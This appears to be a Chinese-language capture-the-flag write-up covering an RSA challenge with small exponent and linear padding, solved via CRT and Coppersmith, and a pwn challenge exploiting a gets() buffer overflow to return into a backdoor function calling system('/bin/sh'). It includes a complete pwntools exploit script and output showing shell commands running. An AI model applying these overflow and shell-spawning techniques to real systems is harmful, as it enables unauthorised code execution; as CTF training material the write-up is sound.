**c = m³ mod n**

# ScatterRSA
加密形式是：

**cᵢ ≡ (aᵢ·m + bᵢ)³ mod nᵢ**

虽然每次的 `a、b、n` 都不同，但明文 `m` 相同，且 `e = 3` 很小。

核心思路：

**构造三个多项式：**

f₁(x) = (a₁x + b₁)³ - c₁ mod n₁  
f₂(x) = (a₂x + b₂)³ - c₂ mod n₂  
f₃(x) = (a₃x + b₃)³ - c₃ mod n₃

因为真正的明文 `m` 满足：

f₁(m) ≡ 0 mod n₁  
f₂(m) ≡ 0 mod n₂  
f₃(m) ≡ 0 mod n₃

然后对多项式的每一项系数做 CRT，合成一个模：

**N = n₁ · n₂ · n₃**

上的三次多项式：

**F(x) ≡ 0 mod N**

由于 flag 很短，`m` 是小根，可以用 Coppersmith 求小根。

# Pwn
## PWN-Authenticate

拿到附件 `uploads/vuln_2_` 后，先查看程序保护：

```bash
checksec ./vuln_2_
```

可以看到这是一个 64 位 ELF 程序，未开启 PIE，且没有 Canary：

![](file-20260530164910137.png)

继续查看函数符号：

```bash
objdump -t ./vuln_2_ | grep -E "backdoor|login|main"
```

![](file-20260530165122644.png)
可以发现程序中存在 `backdoor`、`login`、`main` 三个关键函数：

```plain
00000000004011f6 T backdoor
000000000040120d T login
00000000004012a7 T main
```

其中 `backdoor()` 函数会直接调用 `system`：

```asm
00000000004011f6 <backdoor>:
  4011fe: lea rdi,[rip+0xe03]        # 402008
  401205: call 4010c0 <system@plt>
```

再查看字符串表，可以发现程序中存在 `/bin/sh`：

```bash
strings ./vuln_2_ | grep "/bin/sh"
```

![](file-20260530165106419.png)
所以 `backdoor()` 实际等价于：

```c
system("/bin/sh");
```


![](file-20260530165219779.png)
接着分析 `login()` 函数，发现其中使用了危险函数 `gets`：

```asm
401262: lea    rax,[rbp-0x80]
401266: mov    rdi,rax
401269: mov    eax,0x0
40126e: call   401100 <gets@plt>
```

这里密码缓冲区位于：

```plain
rbp - 0x80
```

返回地址位于：

```plain
rbp + 0x8
```

因此覆盖返回地址需要的偏移为：

```plain
0x80 + 0x8 = 0x88
```

![](file-20260530165324679.png)
![](file-20260530165333899.png)

由于是 64 位程序，调用 `system()` 前需要注意栈 16 字节对齐。如果直接返回到 `backdoor`，可能因为栈未对齐导致程序崩溃，所以需要先加一个 `ret` gadget 做栈对齐。

使用的地址如下：

```plain
ret gadget:  0x40101a
backdoor:    0x4011f6
offset:      0x88
```

最终 payload：

```python
b"A" * 0x88 + p64(0x40101a) + p64(0x4011f6)
```

本地验证脚本如下：

```python
from pwn import *

p = process("./vuln_2_")

p.recvuntil(b"Username: ")
p.sendline(b"guest")

p.recvuntil(b"Password: ")
payload = b"A" * 0x88
payload += p64(0x40101a)
payload += p64(0x4011f6)

p.sendline(payload)

p.sendline(b"echo PWNED; id; exit")
print(p.recvall(timeout=2).decode(errors="ignore"))
```

本地输出如下，可以成功执行命令：

```plain
Invalid credentials.
PWNED
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
```
